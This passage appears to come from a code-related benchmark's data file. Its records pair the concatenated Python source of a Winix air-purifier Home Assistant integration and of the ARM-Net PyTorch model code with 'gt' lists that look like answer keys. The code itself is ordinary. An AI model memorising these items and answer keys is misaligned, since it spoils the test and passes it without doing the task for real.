  self._plasma_on = self._state.get(ATTR_PLASMA) == ON_VALUE\n\n\n\n\n\n        if self._state.get(ATTR_MODE) == MODE_AUTO:\n            self._auto = True\n            self._manual = False\n        elif self._state.get(ATTR_MODE) == MODE_MANUAL:\n            self._auto = False\n            self._manual = True\n\n        if self._state.get(ATTR_AIRFLOW) == AIRFLOW_SLEEP:\n            self._sleep = True\n\n        self._logger.debug(\n            \"%s: updated on=%s, auto=%s, manual=%s, sleep=%s, airflow=%s, plasma=%s\",\n            self._alias,\n            self._on,\n            self._auto,\n            self._manual,\n            self._sleep,\n            self._state.get(ATTR_AIRFLOW),\n            self._plasma_on,\n        )\n\n    def get_state(self) -> dict[str, str]:\n\n        return self._state\n\n    @property\n    def is_on(self) -> bool:\n\n        return self._on\n\n    @property\n    def is_auto(self) -> bool:\n\n        return self._auto\n\n    @property\n    def is_manual(self) -> bool:\n\n        return self._manual\n\n    @property\n    def is_plasma_on(self) -> bool:\n\n        return self._plasma_on\n\n    @property\n    def is_sleep(self) -> bool:\n\n        return self._sleep\n\n    async def async_ensure_on(self) -> None:\n\n        if not self._on:\n            self._on = True\n\n            self._logger.debug(\"%s => turned on\", self._alias)\n            await self._driver.turn_on()\n\n    async def async_turn_on(self) -> None:\n\n        await self.async_ensure_on()\n        await self.async_auto()\n\n    async def async_turn_off(self) -> None:\n\n        if self._on:\n            self._on = False\n\n            self._logger.debug(\"%s => turned off\", self._alias)\n            await self._driver.turn_off()\n\n    async def async_auto(self) -> None:\n\n\n        if not self._auto:\n            self._auto = True\n            self._manual = False\n            self._sleep = False\n            self._state[ATTR_MODE] = MODE_AUTO\n            self._state[\n                ATTR_AIRFLOW\n            ] = AIRFLOW_LOW\n\n            self._logger.debug(\"%s => set mode=auto\", self._alias)\n            await self._driver.auto()\n\n    async def async_plasmawave_on(self, force: bool = False) -> None:\n\n\n        if force or not self._plasma_on:\n            self._plasma_on = True\n            self._state[ATTR_PLASMA] = ON_VALUE\n\n            self._logger.debug(\"%s => set plasmawave=on\", self._alias)\n            await self._driver.plasmawave_on()\n\n    async def async_plasmawave_off(self, force: bool = False) -> None:\n\n\n        if force or self._plasma_on:\n            self._plasma_on = False\n            self._state[ATTR_PLASMA] = OFF_VALUE\n\n            self._logger.debug(\"%s => set plasmawave=off\", self._alias)\n            await self._driver.plasmawave_off()\n\n    async def async_manual(self) -> None:\n\n\n        if not self._manual:\n            self._manual = True\n            self._auto = False\n            self._sleep = False\n            self._state[ATTR_MODE] = MODE_MANUAL\n            self._state[\n                ATTR_AIRFLOW\n            ] = AIRFLOW_LOW\n\n            self._logger.debug(\"%s => set mode=manual\", self._alias)\n            await self._driver.manual()\n\n    async def async_sleep(self) -> None:\n\n\n        if not self._sleep:\n            self._sleep = True\n            self._auto = False\n            self._manual = False\n            self._state[ATTR_AIRFLOW] = AIRFLOW_SLEEP\n            self._state[ATTR_MODE] = MODE_MANUAL\n\n            self._logger.debug(\"%s => set mode=sleep\", self._alias)\n            await self._driver.sleep()\n\n    async def async_set_speed(self, speed) -> None:\n\n\n        if self._state.get(ATTR_AIRFLOW) != speed:\n            self._state[ATTR_AIRFLOW] = speed\n\n\n            await self.async_ensure_on()\n            await self.async_manual()\n\n            self._logger.debug(\"%s => set speed=%s\", self._alias, speed)\n            await getattr(self._driver, speed)()\n\n    async def async_set_preset_mode(self, preset_mode: str) -> None:\n\n\n        preset_mode = preset_mode.strip()\n\n        if preset_mode not in PRESET_MODES:\n            values = [item.value for item in NumericPresetModes]\n\n\n            if preset_mode in values:\n                index = int(preset_mode) - 1\n                preset_mode = PRESET_MODES[index]\n            else:\n                raise ValueError(f\"Invalid preset mode: {preset_mode}\")\n\n        await self.async_ensure_on()\n        self._logger.debug(\"%s => set mode=%s\", self._alias, preset_mode)\n\n        if preset_mode == PRESET_MODE_SLEEP:\n            await self.async_sleep()\n        elif preset_mode == PRESET_MODE_AUTO:\n            await self.async_auto()\n            await self.async_plasmawave_on()\n        elif preset_mode == PRESET_MODE_AUTO_PLASMA_OFF:\n            await self.async_auto()\n            await self.async_plasmawave_off(True)\n        elif preset_mode == PRESET_MODE_MANUAL:\n            await self.async_manual()\n            await self.async_plasmawave_on()\n        elif preset_mode == PRESET_MODE_MANUAL_PLASMA_OFF:\n            await self.async_manual()\n            await self.async_plasmawave_off(True)\n\n'winix/custom_components/winix/const.py'\n:\n\nfrom enum import Enum, unique\nfrom typing import Final\n\nWINIX_DOMAIN: Final = \"winix\"\n\nWINIX_NAME: Final = \"Winix Purifier\"\nWINIX_DATA_KEY: Final = \"fan_winix_air_purifier\"\nWINIX_DATA_COORDINATOR: Final = \"coordinator\"\nWINIX_AUTH_RESPONSE: Final = \"WinixAuthResponse\"\nWINIX_ACCESS_TOKEN_EXPIRATION: Final = \"access_token_expiration\"\n\nATTR_AIRFLOW: Final = \"airflow\"\nATTR_AIR_AQI: Final = \"aqi\"\nATTR_AIR_QUALITY: Final = \"air_quality\"\nATTR_AIR_QVALUE: Final = \"air_qvalue\"\nATTR_FILTER_HOUR: Final = \"filter_hour\"\nATTR_FILTER_REPLACEMENT_DATE: Final = \"filter_replace_date\"\nATTR_LOCATION: Final = \"location\"\nATTR_MODE: Final = \"mode\"\nATTR_PLASMA: Final = \"plasma\"\nATTR_POWER: Final = \"power\"\n\nSENSOR_AIR_QVALUE: Final = \"air_qvalue\"\nSENSOR_AQI: Final = \"aqi\"\nSENSOR_FILTER_LIFE: Final = \"filter_life\"\n\nOFF_VALUE: Final = \"off\"\nON_VALUE: Final = \"on\"\n\n\nSERVICE_PLASMAWAVE_ON: Final = \"plasmawave_on\"\nSERVICE_PLASMAWAVE_OFF: Final = \"plasmawave_off\"\nSERVICE_PLASMAWAVE_TOGGLE: Final = \"plasmawave_toggle\"\nSERVICE_REFRESH_ACCESS: Final = \"refresh_access\"\nSERVICES: Final = [\n    SERVICE_PLASMAWAVE_ON,\n    SERVICE_PLASMAWAVE_OFF,\n    SERVICE_PLASMAWAVE_TOGGLE,\n]\n\n\n\nAIRFLOW_LOW: Final = \"low\"\nAIRFLOW_MEDIUM: Final = \"medium\"\nAIRFLOW_HIGH: Final = \"high\"\nAIRFLOW_TURBO: Final = \"turbo\"\nAIRFLOW_SLEEP: Final = \"sleep\"\n\nORDERED_NAMED_FAN_SPEEDS: Final = [\n    AIRFLOW_LOW,\n    AIRFLOW_MEDIUM,\n    AIRFLOW_HIGH,\n    AIRFLOW_TURBO,\n]\n\n\nMODE_AUTO: Final = \"auto\"\nMODE_MANUAL: Final = \"manual\"\n\nPRESET_MODE_AUTO: Final = \"Auto\"\nPRESET_MODE_AUTO_PLASMA_OFF: Final = \"Auto (PlasmaWave off)\"\nPRESET_MODE_MANUAL: Final = \"Manual\"\nPRESET_MODE_MANUAL_PLASMA_OFF: Final = \"Manual (PlasmaWave off)\"\nPRESET_MODE_SLEEP: Final = \"Sleep\"\nPRESET_MODES: Final = [\n    PRESET_MODE_AUTO,\n    PRESET_MODE_AUTO_PLASMA_OFF,\n    PRESET_MODE_MANUAL,\n    PRESET_MODE_MANUAL_PLASMA_OFF,\n    PRESET_MODE_SLEEP,\n]\n\n\n@unique\nclass NumericPresetModes(str, Enum):\n\n\n    PRESET_MODE_AUTO = \"1\"\n    PRESET_MODE_AUTO_PLASMA_OFF = \"2\"\n    PRESET_MODE_MANUAL = \"3\"\n    PRESET_MODE_MANUAL_PLASMA_OFF = \"4\"\n    PRESET_MODE_SLEEP = \"5\"\n\n'winix/custom_components/winix/fan.py'\n:\n\nfrom __future__ import annotations\n\nimport asyncio\nfrom collections.abc import Mapping\nimport logging\nfrom typing import Any, Optional, Union\n\nimport voluptuous as vol\n\nfrom homeassistant.components.fan import DOMAIN, FanEntity, FanEntityFeature\nfrom homeassistant.config_entries import ConfigEntry\nfrom homeassistant.const import ATTR_ENTITY_ID\nfrom homeassistant.core import HomeAssistant\nimport homeassistant.helpers.config_validation as cv\nfrom homeassistant.helpers.entity_platform import AddEntitiesCallback\nfrom homeassistant.util.percentage import (\n    ordered_list_item_to_percentage,\n    percentage_to_ordered_list_item,\n)\n\nfrom .const import (\n    ATTR_AIRFLOW,\n    ATTR_FILTER_REPLACEMENT_DATE,\n    ATTR_LOCATION,\n    ATTR_POWER,\n    ORDERED_NAMED_FAN_SPEEDS,\n    PRESET_MODE_AUTO,\n    PRESET_MODE_AUTO_PLASMA_OFF,\n    PRESET_MODE_MANUAL,\n    PRESET_MODE_MANUAL_PLASMA_OFF,\n    PRESET_MODE_SLEEP,\n    PRESET_MODES,\n    SERVICES,\n    WINIX_DATA_COORDINATOR,\n    WINIX_DATA_KEY,\n    WINIX_DOMAIN,\n)\nfrom .device_wrapper import WinixDeviceWrapper\nfrom .manager import WinixEntity, WinixManager\n\n_LOGGER = logging.getLogger(__name__)\n\n\nasync def async_setup_entry(\n    hass: HomeAssistant,\n    entry: ConfigEntry,\n    async_add_entities: AddEntitiesCallback,\n):\n\n    data = hass.data[WINIX_DOMAIN][entry.entry_id]\n    manager: WinixManager = data[WINIX_DATA_COORDINATOR]\n    entities = [\n        WinixPurifier(wrapper, manager) for wrapper in manager.get_device_wrappers()\n    ]\n    data[WINIX_DATA_KEY] = entities\n    async_add_entities(entities)\n\n    async def async_service_handler(service_call):\n\n        method = \"async_\" + service_call.service\n        _LOGGER.debug(\"Service '%s' invoked\", service_call.service)\n\n\n        params = {}\n\n        entity_ids = service_call.data.get(ATTR_ENTITY_ID)\n        if entity_ids:\n            devices = [\n                entity\n                for entity in data[WINIX_DATA_KEY]\n                if entity.entity_id in entity_ids\n            ]\n        else:\n            devices = data[WINIX_DATA_KEY]\n\n        state_update_tasks = []\n        for device in devices:\n            if not hasattr(device, method):\n                continue\n\n            await getattr(device, method)(**params)\n            state_update_tasks.append(asyncio.create_task(device.async_update_ha_state(True)))\n\n        if state_update_tasks:\n\n            await asyncio.wait(state_update_tasks)\n\n    for service in SERVICES:\n        hass.services.async_register(\n            WINIX_DOMAIN,\n            service,\n            async_service_handler,\n            schema=vol.Schema({ATTR_ENTITY_ID: cv.entity_ids}),\n        )\n\n    _LOGGER.info(\"Added %s Winix fans\", len(entities))\n\n\nclass WinixPurifier(WinixEntity, FanEntity):\n\n\n\n    _attr_supported_features = FanEntityFeature.PRESET_MODE | FanEntityFeature.SET_SPEED\n\n    def __init__(self, wrapper: WinixDeviceWrapper, coordinator: WinixManager) -> None:\n\n        super().__init__(wrapper, coordinator)\n        self._attr_unique_id = f\"{DOMAIN}.{WINIX_DOMAIN}_{self._mac}\"\n\n    @property\n    def name(self) -> Union[str, None]:\n\n        return None\n\n    @property\n    def extra_state_attributes(self) -> Union[Mapping[str, Any], None]:\n\n        attributes = {}\n        state = self._wrapper.get_state()\n\n        if state is not None:\n            for key, value in state.items():\n\n                if key != ATTR_POWER:\n                    attributes[key] = value\n\n        attributes[ATTR_LOCATION] = self._wrapper.device_stub.location_code\n        attributes[\n            ATTR_FILTER_REPLACEMENT_DATE\n        ] = self._wrapper.device_stub.filter_replace_date\n\n        return attributes\n\n    @property\n    def is_on(self) -> bool:\n\n        return self._wrapper.is_on\n\n    @property\n    def percentage(self) -> Union[int, None]:\n\n        state = self._wrapper.get_state()\n        if state is None:\n            return None\n        if self._wrapper.is_sleep or self._wrapper.is_auto:\n            return None\n        if state.get(ATTR_AIRFLOW) is None:\n            return None\n\n        return ordered_list_item_to_percentage(\n            ORDERED_NAMED_FAN_SPEEDS, state.get(ATTR_AIRFLOW)\n        )\n\n    @property\n    def preset_mode(self) -> Union[str, None]:\n\n        state = self._wrapper.get_state()\n        if state is None:\n            return None\n        if self._wrapper.is_sleep:\n            return PRESET_MODE_SLEEP\n        if self._wrapper.is_auto:\n            return (\n                PRESET_MODE_AUTO\n                if self._wrapper.is_plasma_on\n                else PRESET_MODE_AUTO_PLASMA_OFF\n            )\n        if self._wrapper.is_manual:\n            return (\n                PRESET_MODE_MANUAL\n                if self._wrapper.is_plasma_on\n                else PRESET_MODE_MANUAL_PLASMA_OFF\n            )\n\n        return None\n\n    @property\n    def preset_modes(self) -> Union[list[str], None]:\n\n        return PRESET_MODES\n\n    @property\n    def speed_list(self) -> list:\n\n        return ORDERED_NAMED_FAN_SPEEDS\n\n    @property\n    def speed_count(self) -> int:\n\n        return len(ORDERED_NAMED_FAN_SPEEDS)\n\n    async def async_set_percentage(self, percentage: int) -> None:\n\n        if percentage == 0:\n            await self.async_turn_off()\n        else:\n            await self._wrapper.async_set_speed(\n                percentage_to_ordered_list_item(ORDERED_NAMED_FAN_SPEEDS, percentage)\n            )\n\n        self.async_write_ha_state()\n\n    async def async_turn_on(\n        self,\n        percentage: Optional[int] = None,\n        preset_mode: Optional[str] = None,\n        **kwargs: Any,\n    ) -> None:\n\n\n\n        if percentage:\n            await self.async_set_percentage(percentage)\n        if preset_mode:\n            await self._wrapper.async_set_preset_mode(preset_mode)\n        else:\n            await self._wrapper.async_turn_on()\n\n        self.async_write_ha_state()\n\n    async def async_turn_off(self, **kwargs: Any) -> None:\n\n        await self._wrapper.async_turn_off()\n        self.async_write_ha_state()\n\n    async def async_plasmawave_on(self) -> None:\n\n        await self._wrapper.async_plasmawave_on()\n        self.async_write_ha_state()\n\n    async def async_plasmawave_off(self) -> None:\n\n        await self._wrapper.async_plasmawave_off()\n        self.async_write_ha_state()\n\n    async def async_plasmawave_toggle(self) -> None:\n\n\n        if self._wrapper.is_plasma_on:\n            await self._wrapper.async_plasmawave_off()\n        else:\n            await self._wrapper.async_plasmawave_on()\n\n        self.async_write_ha_state()\n\n    async def async_set_preset_mode(self, preset_mode: str) -> None:\n\n        await self._wrapper.async_set_preset_mode(preset_mode)\n        self.async_write_ha_state()\n\n'winix/tests/test_fan.py'\n:\n\nfrom unittest.mock import AsyncMock, Mock, patch\n\nimport pytest\n\nfrom custom_components.winix.const import (\n    AIRFLOW_HIGH,\n    AIRFLOW_LOW,\n    ATTR_AIRFLOW,\n    ORDERED_NAMED_FAN_SPEEDS,\n    PRESET_MODE_AUTO,\n    PRESET_MODE_AUTO_PLASMA_OFF,\n    PRESET_MODE_MANUAL,\n    PRESET_MODE_MANUAL_PLASMA_OFF,\n    PRESET_MODE_SLEEP,\n    PRESET_MODES,\n    SERVICE_PLASMAWAVE_ON,\n    WINIX_DATA_COORDINATOR,\n    WINIX_DATA_KEY,\n    WINIX_DOMAIN,\n)\nfrom custom_components.winix.fan import WinixPurifier, async_setup_entry\nfrom homeassistant.components.fan import SUPPORT_PRESET_MODE, SUPPORT_SET_SPEED\nfrom homeassistant.config_entries import ConfigEntry\nfrom homeassistant.const import ATTR_ENTITY_ID\nfrom tests import build_fake_manager, build_purifier\n\n\nasync def test_setup_platform(hass):\n\n\n    manager = build_fake_manager(3)\n    config = ConfigEntry(1, WINIX_DOMAIN, \"\", {}, \"Test\", entry_id=\"id1\")\n    hass.data = {WINIX_DOMAIN: {\"id1\": {WINIX_DATA_COORDINATOR: manager}}}\n    async_add_entities = Mock()\n\n    await async_setup_entry(hass, config, async_add_entities)\n\n    assert async_add_entities.called\n    assert len(async_add_entities.call_args[0][0]) == 3\n\n\nasync def test_service(hass):\n\n\n    manager = build_fake_manager(2)\n    config = ConfigEntry(1, WINIX_DOMAIN, \"\", {}, \"Test\", entry_id=\"id1\")\n    hass.data = {WINIX_DOMAIN: {\"id1\": {WINIX_DATA_COORDINATOR: manager}}}\n    async_add_entities = Mock()\n\n    await async_setup_entry(hass, config, async_add_entities)\n\n    first_entity_id = None\n\n\n    data = hass.data[WINIX_DOMAIN][config.entry_id]\n    for device in data[WINIX_DATA_KEY]:\n        device.hass = hass\n        device.entity_id = device.unique_id\n\n        if first_entity_id is None:\n            first_entity_id = device.entity_id\n\n\n    with patch(\n        \"custom_components.winix.fan.WinixPurifier.async_plasmawave_on\"\n    ) as mock_plasmawave_on, patch(\n        \"custom_components.winix.fan.WinixPurifier.async_update_ha_state\"\n    ) as mock_update_ha_state:\n        service_data = {ATTR_ENTITY_ID: [first_entity_id]}\n        await hass.services.async_call(\n            WINIX_DOMAIN, SERVICE_PLASMAWAVE_ON, service_data, blocking=True\n        )\n\n        assert mock_plasmawave_on.call_count == 1\n\n\n        assert mock_update_ha_state.call_count == 1\n\n\n    with patch(\n        \"custom_components.winix.fan.WinixPurifier.async_plasmawave_on\"\n    ) as mock_plasmawave_on, patch(\n        \"custom_components.winix.fan.WinixPurifier.async_update_ha_state\"\n    ) as mock_update_ha_state:\n        await hass.services.async_call(\n            WINIX_DOMAIN, SERVICE_PLASMAWAVE_ON, {}, blocking=True\n        )\n        assert mock_plasmawave_on.call_count == 2\n\n\n        assert mock_update_ha_state.call_count == 2\n\n\ndef test_construction():\n\n    device_wrapper = Mock()\n    device_wrapper.get_state = Mock(return_value={})\n\n    device = WinixPurifier(device_wrapper, Mock())\n    assert device.unique_id is not None\n    assert device.preset_modes == PRESET_MODES\n    assert device.speed_list == ORDERED_NAMED_FAN_SPEEDS\n    assert device.speed_count == len(ORDERED_NAMED_FAN_SPEEDS)\n    assert device.supported_features == (SUPPORT_PRESET_MODE | SUPPORT_SET_SPEED)\n    assert device.device_info is not None\n    assert (\n        device.name is None\n    )\n\n\ndef test_device_availability():\n\n    device_wrapper = Mock()\n    device_wrapper.get_state = Mock(return_value=None)\n\n    device = WinixPurifier(device_wrapper, Mock())\n    assert not device.available\n\n    device_wrapper.get_state = Mock(return_value={})\n    assert device.available\n\n\ndef test_device_attributes():\n\n    device_wrapper = Mock()\n    device_wrapper.get_state = Mock(return_value=None)\n\n    device = WinixPurifier(device_wrapper, Mock())\n    assert device.extra_state_attributes is not None\n\n    device_wrapper.get_state = Mock(return_value={\"DUMMY_ATTR\": 12})\n    assert device.extra_state_attributes[\"DUMMY_ATTR\"] == 12\n\n\n@pytest.mark.parametrize(\"value\", [(True), (False)])\ndef test_device_on(value):\n\n\n    device_wrapper = Mock()\n    type(device_wrapper).is_on = value\n    device = WinixPurifier(device_wrapper, Mock())\n    assert device.is_on == value\n\n\n@pytest.mark.parametrize(\n    \"state,is_sleep,is_auto,expected\",\n    [\n        (None, None, None, None),\n        ({}, True, False, None),\n        ({}, False, True, None),\n        ({ATTR_AIRFLOW: AIRFLOW_LOW}, False, False, 25),\n        ({ATTR_AIRFLOW: AIRFLOW_HIGH}, False, False, 75),\n        ({ATTR_AIRFLOW: None}, None, None, None),\n    ],\n)\ndef test_device_percentage(state, is_sleep, is_auto, expected):\n\n\n    device_wrapper = Mock()\n    type(device_wrapper).is_sleep = is_sleep\n    type(device_wrapper).is_auto = is_auto\n    device_wrapper.get_state = Mock(return_value=state)\n    device = WinixPurifier(device_wrapper, Mock())\n    assert device.percentage is expected\n\n\n@pytest.mark.parametrize(\n    \"state,is_sleep,is_auto,is_manual,is_plasma_on,is_plasma_off,expected\",\n    [\n        (None, None, None, None, None, None, None),\n        ({}, True, False, False, False, False, PRESET_MODE_SLEEP),\n        ({}, False, False, False, False, False, None),\n        ({}, False, True, False, True, False, PRESET_MODE_AUTO),\n        ({}, False, True, False, False, True, PRESET_MODE_AUTO_PLASMA_OFF),\n        ({}, False, False, True, True, False, PRESET_MODE_MANUAL),\n        ({}, False, False, True, False, True, PRESET_MODE_MANUAL_PLASMA_OFF),\n    ],\n)\ndef test_device_preset_mode(\n    state, is_sleep, is_auto, is_manual, is_plasma_on, is_plasma_off, expected\n):\n\n\n    device_wrapper = Mock()\n    type(device_wrapper).is_sleep = is_sleep\n    type(device_wrapper).is_auto = is_auto\n    type(device_wrapper).is_manual = is_manual\n    type(device_wrapper).is_plasma_on = is_plasma_on\n    type(device_wrapper).is_plasma_off = is_plasma_off\n    device_wrapper.get_state = Mock(return_value=state)\n    device = WinixPurifier(device_wrapper, Mock())\n    assert device.preset_mode is expected\n\n\nasync def test_async_set_percentage_zero(hass, mock_device_wrapper):\n\n\n    device = build_purifier(hass, mock_device_wrapper)\n    device.async_turn_off = AsyncMock()\n\n    await device.async_set_percentage(0)\n    assert device.async_turn_off.call_count == 1\n    assert mock_device_wrapper.async_set_speed.call_count == 0\n\n\nasync def test_async_set_percentage_non_zero(hass, mock_device_wrapper):\n\n\n    device = build_purifier(hass, mock_device_wrapper)\n    device.async_turn_off = AsyncMock()\n\n    await device.async_set_percentage(20)\n    assert device.async_turn_off.call_count == 0\n    assert mock_device_wrapper.async_set_speed.call_count == 1\n\n\nasync def test_async_turn_on(hass, mock_device_wrapper):\n\n\n    device = build_purifier(hass, mock_device_wrapper)\n    device.async_set_percentage = AsyncMock()\n\n    await device.async_turn_on()\n    assert device.async_set_percentage.call_count == 0\n    assert mock_device_wrapper.async_set_preset_mode.call_count == 0\n    assert mock_device_wrapper.async_turn_on.call_count == 1\n\n\nasync def test_async_turn_on_percentage(hass, mock_device_wrapper):\n\n\n    device = build_purifier(hass, mock_device_wrapper)\n    device.async_set_percentage = AsyncMock()\n\n    await device.async_turn_on(25)\n    assert device.async_set_percentage.call_count == 1\n    assert mock_device_wrapper.async_set_preset_mode.call_count == 0\n    assert mock_device_wrapper.async_turn_on.call_count == 1\n\n\nasync def test_async_turn_on_preset(hass, mock_device_wrapper):\n\n\n    device = build_purifier(hass, mock_device_wrapper)\n    device.async_set_percentage = AsyncMock()\n\n    await device.async_turn_on(None, PRESET_MODE_MANUAL)\n    assert device.async_set_percentage.call_count == 0\n    assert mock_device_wrapper.async_set_preset_mode.call_count == 1\n    assert mock_device_wrapper.async_turn_on.call_count == 0\n\n\n@pytest.mark.parametrize(\n    \"args\",\n    [\n        ([\"async_turn_off\"]),\n        ([\"async_plasmawave_on\"]),\n        ([\"async_plasmawave_off\"]),\n        ([\"async_set_preset_mode\", PRESET_MODE_MANUAL]),\n    ],\n)\nasync def test_fan_operations(hass, mock_device_wrapper, args):\n\n    mocked_method = AsyncMock()\n    method = args[0]\n\n    with patch.object(mock_device_wrapper, method, mocked_method):\n        device = build_purifier(hass, mock_device_wrapper)\n\n        if len(args) == 2:\n            await getattr(device, method)(args[1])\n        else:\n            await getattr(device, method)()\n\n        assert mocked_method.call_count == 1\n\n\n@pytest.mark.parametrize(\n    \"is_plasma_on\",\n    [\n        (True),\n        (False),\n    ],\n)\nasync def test_plasma_toggle(hass, mock_device_wrapper, is_plasma_on):\n\n    type(mock_device_wrapper).is_plasma_on = is_plasma_on\n\n    device = build_purifier(hass, mock_device_wrapper)\n\n    await device.async_plasmawave_toggle()\n\n    if is_plasma_on:\n        assert mock_device_wrapper.async_plasmawave_off.call_count == 1\n        assert mock_device_wrapper.async_plasmawave_on.call_count == 0\n    else:\n        assert mock_device_wrapper.async_plasmawave_off.call_count == 0\n        assert mock_device_wrapper.async_plasmawave_on.call_count == 1\n",
        "gt": [
            "'winix/custom_components/winix/const.py'",
            "'winix/custom_components/winix/device_wrapper.py'",
            "'winix/custom_components/winix/fan.py'",
            "'winix/tests/test_fan.py'"
        ]
    },
    {
        "files": [
            "'ARM-Net/models/model_utils.py'",
            "'ARM-Net/models/layers.py'",
            "'ARM-Net/train.py'",
            "'ARM-Net/models/dnn.py'"
        ],
        "content": "'ARM-Net/models/model_utils.py'\n:import torch\nfrom models.lr import LRModel\nfrom models.fm import FMModel\nfrom models.hofm import HOFMModel\nfrom models.afm import AFMModel\nfrom models.dcn import CrossNetModel\nfrom models.xdfm import CINModel\n\nfrom models.dnn import DNNModel\nfrom models.gcn import GCNModel\nfrom models.gat import GATModel\n\nfrom models.wd import WDModel\nfrom models.pnn import IPNNModel\nfrom models.pnn import KPNNModel\nfrom models.nfm import NFMModel\nfrom models.dfm import DeepFMModel\nfrom models.dcn import DCNModel\nfrom models.xdfm import xDeepFMModel\n\nfrom models.afn import AFNModel\nfrom models.armnet import ARMNetModel\nfrom models.armnet_1h import ARMNetModel as ARMNet1H\nfrom models.gc_arm import GC_ARMModel\nfrom models.sa_glu import SA_GLUModel\n\ndef create_model(args, logger):\n    logger.info(f'=> creating model {args.model}')\n    if args.model == 'lr':\n        model = LRModel(args.nfeat)\n    elif args.model == 'fm':\n        model = FMModel(args.nfeat, args.nemb)\n    elif args.model == 'hofm':\n        model = HOFMModel(args.nfeat, args.nemb, args.k)\n    elif args.model == 'afm':\n        model = AFMModel(args.nfeat, args.nemb, args.h, args.dropout)\n    elif args.model == 'dcn':\n        model = CrossNetModel(args.nfield, args.nfeat, args.nemb, args.k)\n    elif args.model == 'cin':\n        model = CINModel(args.nfield, args.nfeat, args.nemb, args.k, args.h)\n    elif args.model == 'afn':\n        model = AFNModel(args.nfield, args.nfeat, args.nemb, args.h, args.mlp_nlayer, args.mlp_nhid,\n                    args.dropout, args.ensemble, args.dnn_nlayer, args.dnn_nhid)\n    elif args.model == 'armnet':\n        model = ARMNetModel(args.nfield, args.nfeat, args.nemb, args.nattn_head, args.alpha, args.h,\n                    args.mlp_nlayer, args.mlp_nhid, args.dropout, args.ensemble, args.dnn_nlayer, args.dnn_nhid)\n    elif args.model == 'armnet_1h':\n        model = ARMNet1H(args.nfield, args.nfeat, args.nemb, args.alpha, args.h, args.nemb, args.mlp_nlayer,\n                         args.mlp_nhid, args.dropout, args.ensemble, args.dnn_nlayer, args.dnn_nhid)\n\n    elif args.model == 'dnn':\n        model = DNNModel(args.nfield, args.nfeat, args.nemb, args.mlp_nlayer, args.mlp_nhid, args.dropout)\n    elif args.model == 'gcn':\n        model = GCNModel(args.nfield, args.nfeat, args.nemb, args.k, args.h, args.mlp_nlayer,\n                         args.mlp_nhid, args.dropout)\n    elif args.model == 'gat':\n        model = GATModel(args.nfield, args.nfeat, args.nemb, args.k, args.h,\n                         args.mlp_nlayer, args.mlp_nhid, args.dropout, 0.2, args.nattn_head)\n\n    elif args.model == 'wd':\n        model = WDModel(args.nfield, args.nfeat, args.nemb, args.mlp_nlayer, args.mlp_nhid, args.dropout)\n    elif args.model == 'ipnn':\n        model = IPNNModel(args.nfield, args.nfeat, args.nemb, args.mlp_nlayer, args.mlp_nhid, args.dropout)\n    elif args.model == 'kpnn':\n        model = KPNNModel(args.nfield, args.nfeat, args.nemb, args.mlp_nlayer, args.mlp_nhid, args.dropout)\n    elif args.model == 'nfm':\n        model = NFMModel(args.nfeat, args.nemb, args.mlp_nlayer, args.mlp_nhid, args.dropout)\n    elif args.model == 'dfm':\n        model = DeepFMModel(args.nfield, args.nfeat, args.nemb, args.mlp_nlayer, args.mlp_nhid, args.dropout)\n    elif args.model == 'dcn+':\n        model = DCNModel(args.nfield, args.nfeat, args.nemb, args.k, args.mlp_nlayer, args.mlp_nhid, args.dropout)\n    elif args.model == 'xdfm':\n        model = xDeepFMModel(args.nfield, args.nfeat, args.nemb, args.k, args.h,\n                    args.mlp_nlayer, args.mlp_nhid, args.dropout)\n\n    elif args.model == 'gc_arm':\n        model = GC_ARMModel(args.nfield, args.nfeat, args.nemb, args.nattn_head, args.alpha, args.h, args.mlp_nlayer,\n                            args.mlp_nhid, args.dropout, args.ensemble, args.dnn_nlayer, args.dnn_nhid)\n    elif args.model == 'sa_glu':\n        model = SA_GLUModel(args.nfield, args.nfeat, args.nemb, args.mlp_nlayer, args.mlp_nhid, args.dropout,\n                            args.ensemble, args.dnn_nlayer, args.dnn_nhid)\n\n    else:\n        raise ValueError(f'unknown model {args.model}')\n\n    if torch.cuda.is_available(): model = model.cuda()\n    logger.info(f'{model}\\nmodel parameters: {sum([p.data.nelement() for p in model.parameters()])}')\n    return model\n'ARM-Net/models/layers.py'\n:import math\nimport numpy as np\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\n\n\nclass Embedding(nn.Module):\n\n    def __init__(self, nfeat, nemb):\n        super().__init__()\n        self.embedding = nn.Embedding(nfeat, nemb)\n        nn.init.xavier_uniform_(self.embedding.weight)\n\n    def forward(self, x):\n\n        emb = self.embedding(x['id'])\n        return emb * x['value'].unsqueeze(2)\n\n\nclass Linear(nn.Module):\n\n    def __init__(self, nfeat):\n        super().__init__()\n        self.weight = nn.Embedding(nfeat, 1)\n        self.bias = nn.Parameter(torch.zeros((1,)))\n\n    def forward(self, x):\n\n        linear = self.weight(x['id']).squeeze(2) * x['value']\n        return torch.sum(linear, dim=1) + self.bias\n\n\nclass FactorizationMachine(nn.Module):\n\n    def __init__(self, reduce_dim=True):\n        super().__init__()\n        self.reduce_dim = reduce_dim\n\n    def forward(self, x):\n\n        square_of_sum = torch.sum(x, dim=1)**2\n        sum_of_square = torch.sum(x**2, dim=1)\n        fm = square_of_sum - sum_of_square\n        if self.reduce_dim:\n            fm = torch.sum(fm, dim=1)\n        return 0.5 * fm\n\n\ndef get_triu_indices(n, diag_offset=1):\n\n    return np.triu_indices(n, diag_offset)\n\n\ndef get_all_indices(n):\n\n    return map(list, zip(*[(i, j) for i in range(n) for j in range(n)]))\n\n\nclass MLP(nn.Module):\n\n    def __init__(self, ninput, nlayers, nhid, dropout, noutput=1):\n        super().__init__()\n        layers = list()\n        for i in range(nlayers):\n            layers.append(nn.Linear(ninput, nhid))\n            layers.append(nn.BatchNorm1d(nhid))\n            layers.append(nn.ReLU())\n            layers.append(nn.Dropout(p=dropout))\n            ninput = nhid\n        if nlayers==0: nhid = ninput\n        layers.append(nn.Linear(nhid, noutput))\n        self.mlp = nn.Sequential(*layers)\n\n    def forward(self, x):\n\n        return self.mlp(x)\n\n\ndef normalize_adj(adj):\n\n    rowsum = np.array(adj.sum(1))\n    d_inv_sqrt = np.power(rowsum, -0.5).flatten()\n    d_inv_sqrt[np.isinf(d_inv_sqrt)] = 0.\n    d_mat_inv_sqrt = np.diag(d_inv_sqrt)\n    return adj.dot(d_mat_inv_sqrt).transpose().dot(d_mat_inv_sqrt)\n\n\nclass SelfAttnLayer(nn.Module):\n    def __init__(self, nemb):\n\n        super(SelfAttnLayer, self).__init__()\n        self.Wq = nn.Linear(nemb, nemb, 